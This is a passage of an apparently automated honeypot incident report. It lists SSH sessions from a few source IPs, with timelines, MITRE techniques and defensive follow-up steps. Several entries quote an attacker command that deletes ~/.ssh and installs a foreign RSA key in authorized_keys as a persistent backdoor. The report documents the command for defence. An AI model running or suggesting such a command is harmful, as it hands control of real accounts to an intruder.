| `2026-05-21 10:03:09` | `cowrie.log.closed` |
| `2026-05-21 10:03:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb5f73b46bb2

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-21 10:03 |
| **Last Seen** | 2026-05-21 10:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 10:03:12` | `cowrie.session.connect` |
| `2026-05-21 10:03:12` | `cowrie.client.version` |
| `2026-05-21 10:03:12` | `cowrie.client.kex` |
| `2026-05-21 10:03:13` | `cowrie.login.success` |
| `2026-05-21 10:03:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee50908b7c6d

| Field | Detail |
|---|---|
| **Source IP** | `5.182.83[.]231` |
| **First Seen** | 2026-05-21 10:03 |
| **Last Seen** | 2026-05-21 10:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 10:03:30` | `cowrie.session.connect` |
| `2026-05-21 10:03:30` | `cowrie.client.version` |
| `2026-05-21 10:03:31` | `cowrie.client.kex` |
| `2026-05-21 10:03:31` | `cowrie.login.success` |
| `2026-05-21 10:03:32` | `cowrie.session.params` |
| `2026-05-21 10:03:32` | `cowrie.command.input` |
| `2026-05-21 10:03:32` | `cowrie.command.failed` |
| `2026-05-21 10:03:32` | `cowrie.log.closed` |
| `2026-05-21 10:03:32` | `cowrie.session.params` |
| `2026-05-21 10:03:32` | `cowrie.command.input` |
| `2026-05-21 10:03:33` | `cowrie.session.file_download` |
| `2026-05-21 10:03:33` | `cowrie.log.closed` |
| `2026-05-21 10:03:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.182.83[.]231` to AbuseIPDB if not already reported
- [ ] Block `5.182.83[.]231` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e15b8455defe

| Field | Detail |
|---|---|
| **Source IP** | `5.182.83[.]231` |
| **First Seen** | 2026-05-21 10:03 |
| **Last Seen** | 2026-05-21 10:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 10:03:35` | `cowrie.session.connect` |
| `2026-05-21 10:03:35` | `cowrie.client.version` |
| `2026-05-21 10:03:35` | `cowrie.client.kex` |
| `2026-05-21 10:03:36` | `cowrie.login.success` |
| `2026-05-21 10:03:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.182.83[.]231` to AbuseIPDB if not already reported
- [ ] Block `5.182.83[.]231` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-effd65829b62

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 11:53 |
| **Last Seen** | 2026-05-21 11:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 11:53:05` | `cowrie.session.connect` |
| `2026-05-21 11:53:05` | `cowrie.client.version` |
| `2026-05-21 11:53:06` | `cowrie.client.kex` |
| `2026-05-21 11:53:06` | `cowrie.login.success` |
| `2026-05-21 11:53:06` | `cowrie.session.params` |
| `2026-05-21 11:53:06` | `cowrie.command.input` |
| `2026-05-21 11:53:06` | `cowrie.command.failed` |
| `2026-05-21 11:53:06` | `cowrie.log.closed` |
| `2026-05-21 11:53:07` | `cowrie.session.params` |
| `2026-05-21 11:53:07` | `cowrie.command.input` |
| `2026-05-21 11:53:07` | `cowrie.session.file_download` |
| `2026-05-21 11:53:07` | `cowrie.log.closed` |
| `2026-05-21 11:53:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18417da1ee27

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 11:53 |
| **Last Seen** | 2026-05-21 11:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 11:53:08` | `cowrie.session.connect` |
| `2026-05-21 11:53:08` | `cowrie.client.version` |
| `2026-05-21 11:53:09` | `cowrie.client.kex` |
| `2026-05-21 11:53:09` | `cowrie.login.success` |
| `2026-05-21 11:53:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10fc935205e2

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 11:54 |
| **Last Seen** | 2026-05-21 11:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 11:54:23` | `cowrie.session.connect` |
| `2026-05-21 11:54:23` | `cowrie.client.version` |
| `2026-05-21 11:54:23` | `cowrie.client.kex` |
| `2026-05-21 11:54:24` | `cowrie.login.success` |
| `2026-05-21 11:54:24` | `cowrie.session.params` |
| `2026-05-21 11:54:24` | `cowrie.command.input` |
| `2026-05-21 11:54:24` | `cowrie.command.failed` |
| `2026-05-21 11:54:24` | `cowrie.log.closed` |
| `2026-05-21 11:54:24` | `cowrie.session.params` |
| `2026-05-21 11:54:24` | `cowrie.command.input` |
| `2026-05-21 11:54:24` | `cowrie.session.file_download` |
| `2026-05-21 11:54:24` | `cowrie.log.closed` |
| `2026-05-21 11:54:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-308c12948582

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 11:54 |
| **Last Seen** | 2026-05-21 11:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 11:54:26` | `cowrie.session.connect` |
| `2026-05-21 11:54:26` | `cowrie.client.version` |
| `2026-05-21 11:54:26` | `cowrie.client.kex` |
| `2026-05-21 11:54:27` | `cowrie.login.success` |
| `2026-05-21 11:54:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e57a162dc6c6

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 11:55 |
| **Last Seen** | 2026-05-21 11:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 11:55:37` | `cowrie.session.connect` |
| `2026-05-21 11:55:37` | `cowrie.client.version` |
| `2026-05-21 11:55:37` | `cowrie.client.kex` |
| `2026-05-21 11:55:38` | `cowrie.login.success` |
| `2026-05-21 11:55:38` | `cowrie.session.params` |
| `2026-05-21 11:55:38` | `cowrie.command.input` |
| `2026-05-21 11:55:38` | `cowrie.command.failed` |
| `2026-05-21 11:55:38` | `cowrie.log.closed` |
| `2026-05-21 11:55:38` | `cowrie.session.params` |
| `2026-05-21 11:55:38` | `cowrie.command.input` |
| `2026-05-21 11:55:38` | `cowrie.session.file_download` |
| `2026-05-21 11:55:38` | `cowrie.log.closed` |
| `2026-05-21 11:55:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f0ae128c0c2

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 11:55 |
| **Last Seen** | 2026-05-21 11:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 11:55:40` | `cowrie.session.connect` |
| `2026-05-21 11:55:40` | `cowrie.client.version` |
| `2026-05-21 11:55:40` | `cowrie.client.kex` |
| `2026-05-21 11:55:41` | `cowrie.login.success` |
| `2026-05-21 11:55:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06a0b4b06e98

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 11:56 |
| **Last Seen** | 2026-05-21 11:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 11:56:49` | `cowrie.session.connect` |
| `2026-05-21 11:56:49` | `cowrie.client.version` |
| `2026-05-21 11:56:50` | `cowrie.client.kex` |
| `2026-05-21 11:56:50` | `cowrie.login.success` |
| `2026-05-21 11:56:50` | `cowrie.session.params` |
| `2026-05-21 11:56:50` | `cowrie.command.input` |
| `2026-05-21 11:56:50` | `cowrie.command.failed` |
| `2026-05-21 11:56:50` | `cowrie.log.closed` |
| `2026-05-21 11:56:51` | `cowrie.session.params` |
| `2026-05-21 11:56:51` | `cowrie.command.input` |
| `2026-05-21 11:56:51` | `cowrie.session.file_download` |
| `2026-05-21 11:56:51` | `cowrie.log.closed` |
| `2026-05-21 11:56:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9f6b0306a6b

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 11:56 |
| **Last Seen** | 2026-05-21 11:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 11:56:53` | `cowrie.session.connect` |
| `2026-05-21 11:56:53` | `cowrie.client.version` |
| `2026-05-21 11:56:53` | `cowrie.client.kex` |
| `2026-05-21 11:56:53` | `cowrie.login.success` |
| `2026-05-21 11:56:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34410409067d

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 11:59 |
| **Last Seen** | 2026-05-21 11:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 11:59:17` | `cowrie.session.connect` |
| `2026-05-21 11:59:17` | `cowrie.client.version` |
| `2026-05-21 11:59:17` | `cowrie.client.kex` |
| `2026-05-21 11:59:17` | `cowrie.login.success` |
| `2026-05-21 11:59:18` | `cowrie.session.params` |
| `2026-05-21 11:59:18` | `cowrie.command.input` |
| `2026-05-21 11:59:18` | `cowrie.command.failed` |
| `2026-05-21 11:59:18` | `cowrie.log.closed` |
| `2026-05-21 11:59:18` | `cowrie.session.params` |
| `2026-05-21 11:59:18` | `cowrie.command.input` |
| `2026-05-21 11:59:18` | `cowrie.session.file_download` |
| `2026-05-21 11:59:18` | `cowrie.log.closed` |
| `2026-05-21 11:59:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d17790b28d3

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 11:59 |
| **Last Seen** | 2026-05-21 11:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 11:59:20` | `cowrie.session.connect` |
| `2026-05-21 11:59:20` | `cowrie.client.version` |
| `2026-05-21 11:59:20` | `cowrie.client.kex` |
| `2026-05-21 11:59:20` | `cowrie.login.success` |
| `2026-05-21 11:59:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2a6f72e5b55

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 12:04 |
| **Last Seen** | 2026-05-21 12:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 12:04:15` | `cowrie.session.connect` |
| `2026-05-21 12:04:15` | `cowrie.client.version` |
| `2026-05-21 12:04:15` | `cowrie.client.kex` |
| `2026-05-21 12:04:15` | `cowrie.login.success` |
| `2026-05-21 12:04:15` | `cowrie.session.params` |
| `2026-05-21 12:04:15` | `cowrie.command.input` |
| `2026-05-21 12:04:15` | `cowrie.command.failed` |
| `2026-05-21 12:04:15` | `cowrie.log.closed` |
| `2026-05-21 12:04:16` | `cowrie.session.params` |
| `2026-05-21 12:04:16` | `cowrie.command.input` |
| `2026-05-21 12:04:16` | `cowrie.session.file_download` |
| `2026-05-21 12:04:16` | `cowrie.log.closed` |
| `2026-05-21 12:04:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-004aa8de56db

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 12:04 |
| **Last Seen** | 2026-05-21 12:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 12:04:17` | `cowrie.session.connect` |
| `2026-05-21 12:04:17` | `cowrie.client.version` |
| `2026-05-21 12:04:18` | `cowrie.client.kex` |
| `2026-05-21 12:04:18` | `cowrie.login.success` |
| `2026-05-21 12:04:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dca9104efff

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 12:06 |
| **Last Seen** | 2026-05-21 12:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 12:06:53` | `cowrie.session.connect` |
| `2026-05-21 12:06:53` | `cowrie.client.version` |
| `2026-05-21 12:06:54` | `cowrie.client.kex` |
| `2026-05-21 12:06:54` | `cowrie.login.success` |
| `2026-05-21 12:06:54` | `cowrie.session.params` |
| `2026-05-21 12:06:54` | `cowrie.command.input` |
| `2026-05-21 12:06:54` | `cowrie.command.failed` |
| `2026-05-21 12:06:54` | `cowrie.log.closed` |
| `2026-05-21 12:06:55` | `cowrie.session.params` |
| `2026-05-21 12:06:55` | `cowrie.command.input` |
| `2026-05-21 12:06:55` | `cowrie.session.file_download` |
| `2026-05-21 12:06:55` | `cowrie.log.closed` |
| `2026-05-21 12:06:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cca14b847f9

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 12:06 |
| **Last Seen** | 2026-05-21 12:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 12:06:56` | `cowrie.session.connect` |
| `2026-05-21 12:06:56` | `cowrie.client.version` |
| `2026-05-21 12:06:57` | `cowrie.client.kex` |
| `2026-05-21 12:06:57` | `cowrie.login.success` |
| `2026-05-21 12:06:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5b71d2207c7

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 12:08 |
| **Last Seen** | 2026-05-21 12:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
